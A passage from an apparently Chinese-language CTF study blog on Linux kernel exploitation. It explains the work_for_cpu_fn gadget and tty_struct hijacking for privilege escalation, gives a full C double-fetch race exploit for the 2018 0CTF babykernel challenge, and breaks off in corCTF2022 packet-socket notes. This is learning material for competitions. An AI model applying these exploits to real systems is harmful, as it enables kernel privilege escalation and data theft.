SLAB object (or object whitelist area, when available)</span></span><br><span class="line"><span class="comment"> * - not in kernel text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (static_branch_unlikely(&amp;bypass_usercopy_checks))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Skip all tests if size is zero. */</span></span><br><span class="line"><span class="keyword">if</span> (!n)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for invalid addresses. */</span></span><br><span class="line">check_bogus_address((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for bad stack object. */</span></span><br><span class="line"><span class="keyword">switch</span> (check_stack_object(ptr, n)) &#123;</span><br><span class="line"><span class="keyword">case</span> NOT_STACK:</span><br><span class="line"><span class="comment">/* Object is not touching the current process stack. */</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> GOOD_FRAME:</span><br><span class="line"><span class="keyword">case</span> GOOD_STACK:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Object is either in the correct frame (when it</span></span><br><span class="line"><span class="comment"> * is possible to check) or just generally on the</span></span><br><span class="line"><span class="comment"> * process stack (when frame checking not available).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">usercopy_abort(<span class="string">&quot;process stack&quot;</span>, <span class="literal">NULL</span>, to_user, <span class="number">0</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for bad heap object. */</span></span><br><span class="line">check_heap_object(ptr, n, to_user);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for object in kernel to avoid text exposure. */</span></span><br><span class="line">check_kernel_text_object((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__check_object_size);</span><br></pre></td></tr></table></figure><p>函数要求</p><ul><li>该对象的地址有效</li><li>该对象完全位于堆栈中</li><li>该对象完全位于一个slab分配器的object中(可以小于)</li><li>该对象不能指向内核代码段</li></ul><h2 id="work-for-cpu-fn"><a href="#work-for-cpu-fn" class="headerlink" title="work_for_cpu_fn"></a>work_for_cpu_fn</h2><p>在长亭的wp中使用了work_for_cpu_fn这个函数中的gadget</p><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line"><span class="type">void</span> *arg;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其会有如下调用</p><p><code>*(arg+0x30)=*(arg+0x20)(*(arg+0x28))</code></p><p>也就是说这个函数不经能够劫持实现任意函数调用,同时还能存储返回值(nb嘞)</p><blockquote><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。（如果还需要禁用 SELinux 之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）</p></blockquote><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>在某篇文章中看到,关于调用这个函数似乎还有一些细节,如下</p><ol><li>即便修改了虚表后，调用 write 也无法执行 work_for_cpu_fn 函数的问题。我一直以为这里 write 的逻辑，用面向对象的思维来看就是直接调用 tty_struct 类重写的 write 虚函数，类似于 _IO_FILE 劫持虚表中的 write 指针后 write 就会直接执行劫持的函数的逻辑了。但是实际上不是这样的，在掉用虚表中函数指针前会先调用 tty_write 函数</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">tty_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buf,</span></span><br><span class="line"><span class="params">                     <span class="type">size_t</span> count, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span> =</span> file_tty(file);</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ld</span>;</span></span><br><span class="line"> <span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (tty_paranoia_check(tty, file_inode(file), <span class="string">&quot;tty_write&quot;</span>))</span><br><span class="line">     <span class="keyword">return</span> -EIO;</span><br><span class="line"> <span class="keyword">if</span> (!tty || !tty-&gt;ops-&gt;write || tty_io_error(tty))</span><br><span class="line">         <span class="keyword">return</span> -EIO;</span><br><span class="line"> <span class="comment">/* Short term debug to catch buggy drivers */</span></span><br><span class="line"> <span class="keyword">if</span> (tty-&gt;ops-&gt;write_room == <span class="literal">NULL</span>)</span><br><span class="line">     tty_err(tty, <span class="string">&quot;missing write_room method\n&quot;</span>);</span><br><span class="line"> ld = tty_ldisc_ref_wait(tty);</span><br><span class="line"> <span class="keyword">if</span> (!ld)</span><br><span class="line">     <span class="keyword">return</span> hung_up_tty_write(file, buf, count, ppos);</span><br><span class="line"> <span class="keyword">if</span> (!ld-&gt;ops-&gt;write)</span><br><span class="line">     ret = -EIO;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">     ret = do_tty_write(ld-&gt;ops-&gt;write, tty, file, buf, count);</span><br><span class="line"> tty_ldisc_deref(ld);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后到 do_tty_write 中再进行用户态数据的拷贝，最后才实际调用函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">ssize_t</span> <span class="title function_">do_tty_write</span><span class="params">(</span></span><br><span class="line"><span class="params"> <span class="type">ssize_t</span> (*write)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>),</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> tty_struct *tty,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params"> <span class="type">const</span> <span class="type">char</span> __user *buf,</span></span><br><span class="line"><span class="params"> <span class="type">size_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">ssize_t</span> ret, written = <span class="number">0</span>;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> chunk;</span><br><span class="line"></span><br><span class="line"> ret = tty_write_lock(tty, file-&gt;f_flags &amp; O_NDELAY);</span><br><span class="line"> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * We chunk up writes into a temporary buffer. This</span></span><br><span class="line"><span class="comment">  * simplifies low-level drivers immensely, since they</span></span><br><span class="line"><span class="comment">  * don&#x27;t have locking issues and user mode accesses.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * But if TTY_NO_WRITE_SPLIT is set, we should use a</span></span><br><span class="line"><span class="comment">  * big chunk-size..</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * The default chunk-size is 2kB, because the NTTY</span></span><br><span class="line"><span class="comment">  * layer has problems with bigger chunks. It will</span></span><br><span class="line"><span class="comment">  * claim to be able to handle more characters than</span></span><br><span class="line"><span class="comment">  * it actually does.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">FIXME:</span> This can probably go away now except that 64K chunks</span></span><br><span class="line"><span class="comment">  * are too likely to fail unless switched to vmalloc...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> chunk = <span class="number">2048</span>;</span><br><span class="line"> <span class="keyword">if</span> (test_bit(TTY_NO_WRITE_SPLIT, &amp;tty-&gt;flags))</span><br><span class="line">     chunk = <span class="number">65536</span>;</span><br><span class="line"> <span class="keyword">if</span> (count &lt; chunk)</span><br><span class="line">     chunk = count;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* write_buf/write_cnt is protected by the atomic_write_lock mutex */</span></span><br><span class="line"> <span class="keyword">if</span> (tty-&gt;write_cnt &lt; chunk) &#123;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span> *buf_chunk;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (chunk &lt; <span class="number">1024</span>)</span><br><span class="line">         chunk = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">     buf_chunk = kmalloc(chunk, GFP_KERNEL);</span><br><span class="line">     <span class="keyword">if</span> (!buf_chunk) &#123;</span><br><span class="line">         ret = -ENOMEM;</span><br><span class="line">         <span class="keyword">goto</span> out;</span><br><span class="line">     &#125;</span><br><span class="line">     kfree(tty-&gt;write_buf);</span><br><span class="line">     tty-&gt;write_cnt = chunk;</span><br><span class="line">     tty-&gt;write_buf = buf_chunk;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Do the write .. */</span></span><br><span class="line"> <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">     <span class="type">size_t</span> size = count;</span><br><span class="line">     <span class="keyword">if</span> (size &gt; chunk)</span><br><span class="line">         size = chunk;</span><br><span class="line">     ret = -EFAULT;</span><br><span class="line">     <span class="keyword">if</span> (copy_from_user(tty-&gt;write_buf, buf, size))</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     ret = write(tty, file, tty-&gt;write_buf, size);</span><br><span class="line">     <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     written += ret;</span><br><span class="line">     buf += ret;</span><br><span class="line">     count -= ret;</span><br><span class="line">     <span class="keyword">if</span> (!count)</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     ret = -ERESTARTSYS;</span><br><span class="line">     <span class="keyword">if</span> (signal_pending(current))</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     cond_resched();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (written) &#123;</span><br><span class="line">     tty_update_time(&amp;file_inode(file)-&gt;i_mtime);</span><br><span class="line">     ret = written;</span><br><span class="line"> &#125;</span><br><span class="line">out:</span><br><span class="line"> tty_write_unlock(tty);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一路上要经过一些检测和各种各样操作，一开始我使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(tty_fd, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这样的方法调用，一下子就会挂在 copy_from_user 上，此处需要提供一个正确的 buf，和一定的长度，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(tty_fd, buf_a, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这样就可以调用到劫持的 work_for_cpu_fn 了。</p><p>由于 work_for_cpu_fn 的参数由 write 调用的第一个参数决定，也就是 tty_struct 本身，那么被调函数偏移在 0x20，这个没什么问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf_tty[<span class="number">4</span>] = prepare_kernel_cred_addr;</span><br></pre></td></tr></table></figure><p>这样就可以了，然后第一个参数在偏移 0x28 处，也就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf_tty[<span class="number">5</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>看似没什么问题，但是之后执行到 work_for_cpu_fn 时偏移 0x28 会莫名其妙的变成 1，导致执行 kernel_prepare_cred 时出错，估计是 tty_write 和 do_tty_write 操作中对此处的成员变量进行了操作（此成员变量是一个信号量，这里可能是为了线程同步之类的有一点改变）。</p><p>如果用虚表做 ROP 的话不需要考虑对别的变量的修改，因为不需要考虑参数的问题，但是用 work_for_cpu_fn 来进行函数调用时就需要小心一点了，所以最后还是根据长亭的 WP 换成了 ioctl 来触发。类似的，在调用函数指针前也先调用了 tty_ioctl，这个函数是一个较为巨大的 switch 结构，所以给予的 cmd 的值要比较小心，我尝试了一些随机数都无法达到效果，最后还是根据长亭 WP 用的 233 实现的，也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(tty_fd, 233, 233);</span><br></pre></td></tr></table></figure><p>这样调用。看来 233 这个数确实还是有一些魔力。</p><h1 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty_struct"></a>tty_struct</h1><p>在某一篇文章中ti到tty_struct结构体的大小是不一定的</p><blockquote><p>tty_struct 的 size 并不一定是 0x2e0。正确定位其 size 的做法是在 ida 中解析 vmlinux ，查找字符串 “&amp;tty-&gt;legacy_mutex” 的引用。定位到类似 <code>v2 = (_DWORD *)sub_FFFFFFFF81236300(qword_FFFFFFFF8288F810, 21004480LL, 0x3A8LL);</code> 的函数，最后一个参数就是 tty_struct 的大小。（即使 0x2e0 和 0x3a8 都是 0x400 的 slub）</p></blockquote><h1 id="2018-0ctf-final-babykernel"><a href="#2018-0ctf-final-babykernel" class="headerlink" title="2018-0ctf-final-babykernel"></a>2018-0ctf-final-babykernel</h1><p>驱动主要注册了一个 <code>baby_ioctl</code> 函数，其中包含两个功能。</p><ul><li>当 ioctl 中 cmd 参数为 0x6666 时，驱动将输出 flag 的加载地址。</li><li>当 ioctl 中 cmd 参数为 0x1337 时，首先进行三个校验，接着对用户输入的内容与硬编码的 flag 进行逐字节比较，当一致时通过 <code>printk</code> 将 flag 输出出来。</li></ul><p>应该传入如下结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> *flag;</span><br><span class="line"><span class="type">size_t</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>检查校验时涉及到一个自己实现的检查函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  v3 = __CFADD__(a2, a1);</span><br><span class="line">  v4 = a2 + a1;</span><br><span class="line">  <span class="keyword">return</span> v3 || a3 &lt; v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CFADD</strong> 的作用是 carry flag of addition，获得两数相加的 CF 位（进位），重点是 a3 &lt; v4，其中 a3 是 (unsigned int)&amp;current_task) + 0x1358)，对应结构体中的值就是：task_struct-&gt;thread-&gt;fpu-&gt;state，而 v4 是 a1 和 a2 的和，在第二个判断条件中，对应传入的 flag 的最后一个字节的地址。</p><p>那么三条检查就分别对应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.输入的输入指针是否为用户态数据</span><br><span class="line">2.数据指针内的 flag_str 是否指向用户态</span><br><span class="line">3.数据指针内 flag_len 是否等于硬编码 flag 的长度</span><br></pre></td></tr></table></figure><p>有 flag 的地址，但因为在内核空间中，直接传的话不能通过验证，所以先传入一个用户空间的合法地址，然后开另一个线程不断竞争修改其为内核空间 flag 的地址。</p><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> compete_thread;</span><br><span class="line"><span class="type">void</span>* real_addr;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20</span>] = <span class="string">&quot;padding.....&quot;</span>;</span><br><span class="line"><span class="type">int</span> competetion_times = <span class="number">0x1000</span>, status = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x1000</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span>* flag_addr;</span><br><span class="line">    <span class="type">int</span> flag_len;</span><br><span class="line">&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="number">33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">competetionThread</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; competetion_times; i++)</span><br><span class="line">            flag.flag_addr = real_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd, result_fd, addr_fd;</span><br><span class="line">    <span class="type">char</span>* temp, *flag_addr_addr;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);</span><br><span class="line">    temp = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);    </span><br><span class="line">    addr_fd = open(<span class="string">&quot;./addr.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    temp[read(addr_fd, temp, <span class="number">0x100</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    flag_addr_addr = <span class="built_in">strstr</span>(temp, <span class="string">&quot;Your flag is at &quot;</span>) + <span class="built_in">strlen</span>(<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    real_addr = strtoull(flag_addr_addr, flag_addr_addr + <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">   pthread_create(&amp;compete_thread, <span class="literal">NULL</span>, competetionThread, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span> (status)</span><br><span class="line">    &#123;    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; competetion_times; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag.flag_addr = buf;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;flag);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);</span><br><span class="line">        result_fd = open(<span class="string">&quot;./result.txt&quot;</span>, O_RDONLY);</span><br><span class="line">        read(result_fd, temp, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(temp, <span class="string">&quot;flag&#123;&quot;</span>))</span><br><span class="line">            status = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_cancel(compete_thread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] competetion end!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Double Fetch</code> 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。</p><p>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。</p><p>一个典型的 <code>Double Fetch</code> 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p><h1 id="corCTF2022-cache-of-castaways"><a href="#corCTF2022-cache-of-castaways" class="headerlink" title="corCTF2022 - cache-of-castaways"></a>corCTF2022 - cache-of-castaways</h1><p>用于学习<code>Cross-Cache Overflow</code> 和 <code>Page-level Heap Fengshui</code>这两种技术</p><h2 id="setsockopt"><a href="#setsockopt" class="headerlink" title="setsockopt"></a>setsockopt</h2><p>具体的实现暂且不深入了解</p><p>我们使用时只需要知道以下几点</p><p>当创建一个协议为<code>PF_PACKET</code>的socket时,如下</p><p><code>socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</code></p><p>如果再先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code>或者<code>TPACKET_V2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> version = TPACKET_V1;</span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br></pre></td></tr></table></figure><p>那么之后当我们创建如下这样一个结构体时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span 